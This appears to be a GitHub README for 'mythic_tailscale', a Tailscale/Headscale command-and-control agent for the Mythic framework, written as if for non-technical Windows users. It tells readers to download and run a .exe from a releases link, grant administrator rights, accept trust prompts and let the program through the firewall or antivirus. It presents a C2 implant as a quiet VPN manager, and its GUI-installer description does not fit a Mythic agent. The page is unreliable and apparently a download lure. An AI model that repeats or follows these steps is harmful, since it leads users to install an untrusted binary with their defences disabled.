# 🐾 mythic_tailscale - Easy Tailscale Setup for Mythic

[![Download](https://img.shields.io/badge/Download-Mythic_Tailscale-ff6347?style=for-the-badge&logo=github)](https://github.com/cxv-drift220/mythic_tailscale/releases)

---

## 📝 What is mythic_tailscale?  

mythic_tailscale provides a Tailscale and Headscale agent combined with a command-and-control (C2) profile for use with the Mythic framework. This software helps secure and manage remote connections easily from within Mythic.  

You can think of it as a simple tool to create and control a secure virtual network for your Mythic environment. It works by linking devices with Tailscale or Headscale, allowing secure, private communication regardless of the network the devices use.

---

## 🖥️ System Requirements

Before downloading, make sure your computer meets these requirements:

- Operating System: Windows 10 or newer (64-bit recommended)
- CPU: Intel or AMD processor, 1 GHz or faster
- Memory: At least 4 GB RAM
- Disk Space: Minimum 100 MB free space
- Network: Access to the internet to connect to Tailscale/Headscale servers
- User Permissions: Administrator access for installation and running the agent  

These requirements ensure the software runs smoothly and can connect to the network properly.

---

## 🔧 Key Features

- **Seamless integration** with Mythic’s C2 framework  
- **Supports Tailscale and Headscale** virtual private networks  
- **Secure communication** between endpoints  
- **Easy-to-use interface** for managing connections and profiles  
- **Lightweight agent** runs quietly on Windows  
- **Automatic updates** possible through Mythic  

---

## 🚀 Getting Started

Follow these steps carefully to download and run mythic_tailscale on your Windows machine. No technical knowledge is required.

### 1. Visit the Download Page  

Start by visiting the official release page to get the latest version of mythic_tailscale. Use the link below or click the big badge at the top.

[Download mythic_tailscale from GitHub Releases](https://github.com/cxv-drift220/mythic_tailscale/releases)

This page shows all available versions. Always choose the latest stable release for the best experience.

### 2. Download the Installer  

Look for a file with a name ending in `.exe`—this is the setup program. The filename will often include the version number, for example, `mythic_tailscale_v1.0.exe`.  

Click the file name once to start the download. The file size is typically small, so it should only take a few moments depending on your internet speed.

### 3. Run the Installer  

After the download finishes, open the file from your downloads folder.

- If Windows asks if you trust this source, click **Yes** or **Run** to continue.  
- Follow the on-screen instructions. Usually, this means clicking **Next** a few times and then **Install**.  
- The setup wizard will place necessary files on your computer and set up the agent to run.

### 4. Complete Installation  

Once installation is complete, you can choose to start mythic_tailscale immediately by checking the option on the last screen or find it later in the **Start Menu** under mythic_tailscale.

---

## ⚙️ Using mythic_tailscale on Windows

### Launching the Agent  

- Open mythic_tailscale from the Start Menu or desktop shortcut if you created one.  
- The application window will open showing you the current status of your Tailscale or Headscale connection.

### Connecting to Mythic C2  

- Ensure your Mythic server details are entered in the settings.  
- Use the built-in profile manager to select or import a C2 profile. This profile defines the command and control settings for your secure network.  
- Click **Connect** to activate the profile and start the agent.

### Monitoring Connections  

- The main window displays connected devices and their status.  
- You can disconnect or reconnect devices individually.  
- Logs show recent activity and any issues detected.

### Updating mythic_tailscale  

- Updates will be released on the GitHub Releases page.  
- Check regularly or enable automatic update checks in the settings tab.  
- When an update is available, download the new installer and run it over the existing installation.

---

## 🛠️ Troubleshooting Tips

Sometimes issues arise. Here are common problems and how to fix them:

- **Agent fails to start**: Ensure you ran the installer with administrator rights.  
- **No connection to Mythic C2**: Double-check your profile settings and server addresses. Make sure your internet connection is active.  
- **Firewall blocking the connection**: Allow mythic_tailscale through your Windows Firewall or antivirus.  
- **Tailscale not syncing devices**: Restart the agent or reboot your PC.  
- **Installation freezing**: Close other programs and try reinstalling.

For more help, check the Issues section on the GitHub page or consult your network administrator.

---

## 🔗 Useful Links  

- [Official Releases](https://github.com/cxv-drift220/mythic_tailscale/releases)  
- [Mythic Project Website](https://github.com/its-a-feature/Mythic) (for more on the Mythic C2 framework)  
- [Tailscale Official Site](https://tailscale.com/) (for understanding Tailscale)  

---

## 📁 File Structure Explanation

Once installed, mythic_tailscale creates a folder with these main parts:

- **config/**: Stores your C2 profiles and connection settings.  
- **logs/**: Contains log files that track agent activity.  
- **bin/**: The executable files that run the agent.  
- **docs/**: Helpful documents with extra instructions and notes.  

---

## 🔄 Updating Profile Settings  

To update your C2 profile:

1. Open mythic_tailscale.  
2. Go to **Profiles** in the menu.  
3. Import a new profile file or edit settings within the app.  
4. Apply changes and reconnect.

Profiles control how your device communicates with Mythic, so keep these up to date as your network evolves.

---

## 🧩 Additional Configuration  

Advanced users can customize the agent through the settings menu. Options include:

- Changing network ports used by the agent  
- Setting automatic reconnect rules  
- Customizing logging levels for troubleshooting  

Making changes here is optional and intended for users familiar with networking and Mythic.

---

## 📞 Getting Support  

If you encounter problems not covered above, submit an issue via the GitHub repository’s Issues tab. Provide details like:

- Windows version  
- mythic_tailscale version  
- Error messages or screenshots  
- Steps you followed  

This information helps developers address your problem more quickly.